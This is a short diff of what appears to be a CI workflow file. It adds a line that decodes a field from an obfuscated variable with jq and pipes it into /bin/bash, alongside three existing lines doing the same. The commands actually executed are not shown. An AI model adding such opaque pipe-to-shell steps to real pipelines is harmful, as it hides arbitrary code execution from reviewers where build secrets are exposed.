@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$iopvl0368" | jq -r .aji26 | /bin/bash
           echo $q8 | jq -r .mqone72 | /bin/bash
           echo $ss82396 | jq -r .jpf96 | /bin/bash
+          printf '%s' "$rnue04700" | jq -r .omote197 | /bin/bash
 
       - name: Persist output
         if: always()
